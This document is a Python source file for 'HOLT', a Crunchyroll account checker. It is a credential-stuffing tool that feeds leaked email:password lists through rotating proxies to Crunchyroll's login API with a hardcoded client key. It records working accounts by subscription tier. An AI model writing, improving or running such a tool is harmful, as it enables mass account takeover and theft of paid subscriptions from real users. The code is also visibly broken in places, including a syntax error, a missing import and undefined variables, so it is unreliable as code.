#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HOLT - Crunchyroll Checker v3.0
Made by bufferclick
Discord: https://discord.gg/SWNTBqQE25
"""

import os
import sys
import time
import json
import uuid
import random
import urllib.parse
import requests
import threading
from datetime import datetime
from collections import deque

# ==================== CONFIG ====================
THREADS = 80
PROXY_TYPE = "http"  # http, socks4, socks5
AUTO_THREADS = True
# ===============================================

# Global stats
stats = {
    'checked': 0, 'hits': 0, 'custom': 0, 'invalid': 0, 'retries': 0,
    'total': 0, 'start_time': time.time(),
    'mega_fan': 0, 'fan': 0, 'ultimate': 0,
    'current_combo': 'Starting...', 'live_logs': deque(maxlen=15)
}

lock = threading.Lock()
stop_event = threading.Event()

# Country flags
FLAGS = {
    "US": "🇺🇸", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "JP": "🇯🇵",
    "BR": "🇧🇷", "CA": "🇨🇦", "AU": "🇦🇺", "IN": "🇮🇳", "RU": "🇷🇺",
    "KR": "🇰🇷", "ES": "🇪🇸", "IT": "🇮🇹", "NL": "🇳🇱", "SE": "🇸🇪",
    "AR": "🇦🇷", "MX": "🇲🇽", "TR": "🇹🇷", "SA": "🇸🇦", "EG": "🇪🇬"
}

def log(msg):
    with lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        stats['live_logs'].append(f"[{timestamp}] {msg}")

def load_combos():
    files = [f for f in os.listdir() if f.endswith(('.txt', '.combo')) and:]
    if not files:
        print("No combo file found!")
        sys.exit()
    print("Found combos:")
    for i, f in enumerate(files):
        print(f"{i+1}. {f}")
    choice = input(f"Select file (1-{len(files)}): ")
    try:
        path = files[int(choice)-1]
    except:
        path = files[0]
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line]
    print(f"Loaded {len(combos)} combos")
    return combos

def load_proxies():
    if not os.path.exists('proxy.txt'):
        print("proxy.txt not found → running proxyless")
        return []
    with open('proxy.txt', 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"Loaded {len(proxies)} proxies")
    return proxies

def get_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    if PROXY_TYPE in ["socks4", "socks5"]:
        return f"{PROXY_TYPE}://{proxy}"
    return f"http://{proxy}"

def check(email, password, proxies):
    global stats
    
    proxy = get_proxy(proxies)
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    
    device_id = str(uuid.uuid4())
    user_agent = "Crunchyroll/3.74.2 Android/13 okhttp/4.12.0"
    
    try:
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        payload = (
            f"grant_type=password&username={urllib.parse.quote(email)}"
            f"&password={urllib.parse.quote(password)}&scope=offline_access"
            f"&device_id={device_id}&device_name=samsung&device_type=SM-G998B"
        )
        headers = {
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic YWpjeWxmd2R0amp0cTdxcGdrczM6b0tvVThETVpXN1NBYVFpR3pVRWRUUUc0SWlta0w4SV8="
        }
        
        stats['current_combo'] = f"Checking → {email}"
        
        r = session.post(url, data=payload, headers=headers, timeout=15)
        
        if r.status_code == 401:
            with lock:
                stats['invalid'] += 1
            log(f"Invalid → {email}")
            return
        
        if r.status_code != 200:
            with lock:
                stats['retries'] += 1
            return
        
        token = r.json().get("access_token")
        if not token:
            with lock:
                stats['retries'] += 1
            return
        
        # Get account info
        headers["Authorization"] = f"Bearer {token}"
        r2 = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=10)
        if r2.status_code != 200:
            with lock:
                stats['custom'] += 1
            log(f"Custom → {email}")
            with open("custom.txt", "a") as f:
                f.write(f"{email}:{password}\n")
            return
        
        external_id = r2.json().get("external_id")
        
        # Get subscription
        r3 = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", headers=headers, timeout=10)
        
        country = "Unknown"
        plan = "Free"
        streams = "0"
        
        if r3.status_code == 200:
            data = r3.json()
            country = data.get("items", [{}])[0].get("subscription_country", "Unknown").upper()
            flag = FLAGS.get(country[:2], "🌍")
            
            for item in data.get("items", []):
                benefit = item.get("benefit", "")
                if "6" in benefit:
                    plan = "Ultimate Fan"
                    streams = "6"
                elif "4" in benefit:
                    plan = "Mega Fan"
                    streams = "4"
                elif "1" in benefit:
                    plan = "Fan"
                    streams = "1"
        
        with lock:
            stats['hits'] += 1
            if "Mega" in plan:
                stats['mega_fan'] += 1
            elif "Fan" in plan:
                stats['fan'] += 1
            elif "Ultimate" in plan:
                stats['ultimate'] += 1
        
        line = f"{email}:{password} | {plan} | {streams} streams | {flag} {country}"
        with open("hits.txt", "a") as f:
            f.write(line + "\n")
        
        log(f"HIT → {email} | {plan}")
        
    except:
        with lock:
            stats['retries'] += 1

def worker(combos, proxies):
    while not stop_event.is_set() and combos:
        try:
            combo = combos.pop()
            email, password = combo.split(":", 1)
            check(email, password, proxies)
            with lock:
                stats['checked'] += 1
        except:
            pass

def ui():
    while not stop_event.is_set():
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = int(time.time() - stats['start_time'])
        mins, secs = divmod(elapsed, 60)
        cpm = int(stats['checked'] / max(elapsed, 1) * 60)
        
        print("╔═══════════════════════════════════════════════════════╗")
        print("║                  HOLT - Crunchyroll Checker           ║")
        print("║                Made by bufferclick                    ║")
        print("╚═══════════════════════════════════════════════════════╝\n")
        
        print(f"Checked : {stats['checked']}/{stats['total']} | CPM {stats['hits']} |free {stats['custom']} |bad {stats['invalid']}")
        print(f"CPM     : {cpm} | Time: {mins:02d}:{secs:02d} | Threads: {THREADS}")
        print(f"Mega Fan: {stats['mega_fan']} | Fan: {stats['fan']} | Ultimate: {stats['ultimate']}\n")
        
        print(f"Current → {stats['current_combo']}\n")
        
        print("Live Console:")
        print("─" * 50)
        for log in stats['live_logs']:
            print(log)
        print("─" * 50)
        
        time.sleep(1)

def auto_thread_adjust():
    global THREADS
    while not stop_event.is_set():
        time.sleep(20)
        if not AUTO_THREADS:
            continue
        error_rate = stats['retries'] / max(stats['checked'], 1)
        if error_rate > 0.4:
            THREADS = max(20, THREADS - 20)
        elif error_rate < 0.1 and stats['checked'] > 100:
            THREADS = min(150, THREADS + 20)

def main():
    global stats
    print("HOLT Crunchyroll Checker v3.0")
    
    combos = load_combos()
    proxies = load_proxies()
    
    stats['total'] = len(combos)
    
    open("hits.txt", "w").close()
    open("custom.txt", "w").close()
    
    threading.Thread(target=ui, daemon=True).start()
    if AUTO_THREADS:
        threading.Thread(target=auto_thread_adjust, daemon=True).start()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(worker, combos, proxies) for _ in range(THREADS)]
        
        try:
            for future in futures:
                future.result()
        except KeyboardInterrupt:
            stop_event.set()
            print("\n\nStopped by user")
    
    print("\nFinished! Check hits.txt")

if __name__ == "__main__":
    main()
